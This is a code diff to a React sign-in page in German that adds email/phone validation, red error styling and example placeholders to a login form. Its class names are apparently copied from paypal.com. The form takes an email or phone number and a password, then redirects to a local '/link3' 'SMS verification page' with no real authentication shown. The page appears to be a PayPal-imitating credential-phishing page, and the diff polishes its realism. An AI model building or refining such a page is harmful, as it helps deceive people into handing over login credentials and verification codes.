@@ -15,6 +15,43 @@ export const SigninPage = (): JSX.Element => {
   const [emailValue, setEmailValue] = useState("");
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [passwordValue, setPasswordValue] = useState("");
+  const [emailError, setEmailError] = useState("");
+
+  // Validation function for email or phone
+  const validateEmailOrPhone = (value: string) => {
+    if (!value) {
+      setEmailError("Bitte geben Sie eine E-Mail-Adresse oder Handynummer ein.");
+      return false;
+    }
+
+    // Check if it's a phone number (starts with + and contains digits)
+    const phoneRegex = /^\+\d{1,4}\s?\d{3,14}$/;
+    // Check if it's an email (contains @ and domain)
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (phoneRegex.test(value) || emailRegex.test(value)) {
+      setEmailError("");
+      return true;
+    } else {
+      if (value.includes("@")) {
+        setEmailError("Bitte geben Sie eine gültige E-Mail-Adresse ein (z.B. name@domain.com).");
+      } else {
+        setEmailError("Bitte geben Sie eine gültige Telefonnummer ein (z.B. +49 123 456789).");
+      }
+      return false;
+    }
+  };
+
+  // Handle email/phone input change
+  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value;
+    setEmailValue(value);
+    
+    // Clear error when user starts typing
+    if (emailError && value) {
+      setEmailError("");
+    }
+  };
 
   // Get returnUri from URL parameters
   const returnUri = useMemo(() => {
@@ -43,8 +80,17 @@ export const SigninPage = (): JSX.Element => {
   ];
 
   const handleSubmit = () => {
-    // Redirect to SMS verification page
-    window.location.href = "/link3";
+    // Validate email/phone before submitting
+    const isValidEmail = validateEmailOrPhone(emailValue);
+    
+    if (!passwordValue) {
+      return; // Don't submit if password is empty
+    }
+    
+    if (isValidEmail) {
+      // Redirect to SMS verification page
+      window.location.href = "/link3";
+    }
   };
 
   return (
@@ -67,23 +113,38 @@ export const SigninPage = (): JSX.Element => {
             <CardContent className="flex flex-col items-start gap-[31.91px] p-0 w-full">
               <div className="flex flex-col items-start w-full">
                 <div className="flex flex-col items-start gap-4 w-full">
-                  <div className="relative w-full">
+                  <div className="relative w-full mb-6">
                     <Input
-                      className="h-12 md:h-16 pt-6 md:pt-[30.5px] pb-3 md:pb-[16.5px] px-3 border border-solid border-[#999999] rounded-md focus:outline-none focus:border-blue-500"
+                      className={`h-12 md:h-16 pt-6 md:pt-[30.5px] pb-3 md:pb-[16.5px] px-3 border border-solid rounded-md focus:outline-none transition-colors duration-200 ${
+                        emailError 
+                          ? 'border-red-500 focus:border-red-500' 
+                          : 'border-[#999999] focus:border-blue-500'
+                      }`}
                       value={emailValue}
-                      onChange={(e) => setEmailValue(e.target.value)}
+                      onChange={handleEmailChange}
                       onFocus={() => setEmailFocused(true)}
-                      onBlur={() => setEmailFocused(false)}
+                      onBlur={() => {
+                        setEmailFocused(false);
+                        if (emailValue) validateEmailOrPhone(emailValue);
+                      }}
+                      placeholder="z.B. max@domain.com oder +49 123 456789"
                     />
                     <label 
-                      className={`absolute left-[11px] font-www-paypal-com-semantic-label text-wwwpaypalcomnevada transition-all duration-200 ease-in-out pointer-events-none ${
+                      className={`absolute left-[11px] font-www-paypal-com-semantic-label transition-all duration-200 ease-in-out pointer-events-none ${
                         emailFocused || emailValue 
                           ? 'top-[6px] md:top-[8px] text-xs' 
                           : 'top-[12px] md:top-[19px] text-sm md:text-base'
+                      } ${
+                        emailError ? 'text-red-500' : 'text-wwwpaypalcomnevada'
                       }`}
                     >
                       E-Mail-Adresse oder Handynummer
                     </label>
+                    {emailError && (
+                      <div className="absolute top-full mt-1 left-0 text-xs text-red-500 font-normal leading-tight">
+                        {emailError}
+                      </div>
+                    )}
                   </div>
 
                   <div className="flex flex-col items-start gap-4 w-full pb-4">
